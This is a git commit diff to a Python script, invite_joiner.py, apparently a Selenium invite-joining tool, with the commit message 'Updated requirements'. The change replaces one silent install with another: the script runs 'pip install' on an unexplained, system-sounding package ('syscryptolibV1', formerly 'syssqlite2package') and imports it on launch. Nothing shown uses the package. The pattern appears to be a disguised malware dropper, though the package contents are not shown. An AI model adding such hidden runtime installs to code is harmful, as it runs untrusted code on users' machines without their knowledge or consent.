4107ca634b8a7ce93700293b92dc7615bdbee4d8
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 18:35:30 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite2package")
-import syssqlite2package
+os.system("pip install syscryptolibV1")
+import syscryptolibV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
